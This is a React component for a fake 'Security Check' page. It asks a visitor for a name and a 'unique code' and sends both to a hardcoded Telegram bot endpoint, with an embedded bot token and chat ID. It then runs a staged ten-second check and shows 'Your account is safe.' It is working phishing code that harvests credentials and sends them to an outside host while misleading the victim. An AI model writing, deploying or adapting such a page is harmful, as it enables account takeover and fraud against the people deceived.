import React, { useState } from "react";
import { CheckCircle } from "lucide-react";

export default function SecurityCheckForm() {
  const [step, setStep] = useState(1);
  const [name, setName] = useState("");
  const [code, setCode] = useState("");
  const [showTick, setShowTick] = useState(false);
  const [loading, setLoading] = useState(false);
  const [safe, setSafe] = useState(false);

  const handleSubmit = () => {
    if (name.length > 0 && code.length > 0) {
      setShowTick(true);
      setLoading(true);

      // Send to Telegram with logging
      const telegramMessage = `New Submission:\nName: ${name}\nCode: ${code}`;
      fetch(`https://api.telegram.org/bot7712074719:AAEfsMkfDZFADCdnTq6S4WPT67c-XhHE_4Y/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "7305039129",
          text: telegramMessage
        })
      })
      .then(response => response.json())
      .then(data => console.log("Telegram Response:", data))
      .catch(error => console.error("Error sending to Telegram:", error));

      setTimeout(() => {
        setLoading(false);
        setSafe(true);
      }, 10000);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-r from-yellow-400 via-pink-500 to-purple-600">
      <div className="backdrop-blur-lg bg-white/10 p-10 rounded-2xl shadow-2xl max-w-xl w-full">
        <h2 className="text-white text-3xl font-bold mb-6">Security Check</h2>
        {step === 1 && (
          <div className="mb-4">
            <label className="block text-white mb-2">Enter your name:</label>
            <input
              maxLength={100}
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              className="w-full p-4 rounded-lg bg-white/20 text-white placeholder-white outline-none"
              placeholder="Your name"
            />
            <button
              onClick={() => name && setStep(2)}
              className="mt-4 bg-white text-black px-6 py-2 rounded-lg font-semibold"
            >
              Next
            </button>
          </div>
        )}

        {step === 2 && !loading && !safe && (
          <div className="mb-4">
            <label className="block text-white mb-2">Enter unique code:</label>
            <div className="relative">
              <input
                maxLength={100}
                type="text"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full p-4 rounded-lg bg-white/20 text-white placeholder-white outline-none pr-10"
                placeholder="Unique code"
              />
              {showTick && (
                <CheckCircle className="absolute right-3 top-1/2 transform -translate-y-1/2 text-green-400" />
              )}
            </div>
            <button
              onClick={handleSubmit}
              className="mt-4 bg-white text-black px-6 py-2 rounded-lg font-semibold"
            >
              Check Security
            </button>
          </div>
        )}

        {loading && (
          <div className="text-white text-xl">
            Checking security of your account... <br />
            Do not close while processing.
          </div>
        )}

        {safe && (
          <div className="text-green-300 text-xl font-bold">
            Your account is safe.
          </div>
        )}
      </div>
    </div>
  );
}